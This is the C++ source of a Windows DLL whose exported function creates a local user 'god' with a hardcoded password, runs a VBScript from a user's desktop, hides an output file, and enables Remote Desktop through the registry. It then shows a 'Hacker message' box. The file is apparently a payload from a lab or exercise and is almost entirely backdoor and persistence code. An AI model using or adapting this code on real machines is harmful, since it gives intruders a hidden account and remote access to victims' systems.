// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>
#include <stdio.h>
#include <netfw.h>
#include<stdio.h>
#include <iostream>
#include <fstream>
#include<string>
#include<cstdio>
#include<Fileapi.h>
#include <tchar.h>
#include <winbase.h>
#include<lmaccess.h>
#include <lm.h>
#include <strsafe.h>

#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")


extern "C" _declspec(dllexport)
void doSomething(void)
{

    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);
    DWORD           dwAttrs;

    USER_INFO_1 ui;

    ui.usri1_name = (LPWSTR)"god";
    ui.usri1_password = (LPWSTR)"P@ssw0rd124";
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;



    NET_API_STATUS nStatus;
    DWORD dwError = 0;

    nStatus = NetUserAdd(NULL,
        1,
        (LPBYTE)&ui,
        &dwError);


 
    
   system("C:\\Users\\pxj59\\Desktop\\invis.vbs");
   SetFileAttributesW(L"C:\\Users\\pxj59\\Desktop\output.txt", FILE_ATTRIBUTE_HIDDEN);




    DWORD value = 0;
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, TEXT("fDenyTSConnections"), 0, REG_DWORD, (const BYTE*)&value, sizeof(value));






    MessageBox(NULL, L"Hello hello added reg key for this one!", L"Hacker message", NULL);
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

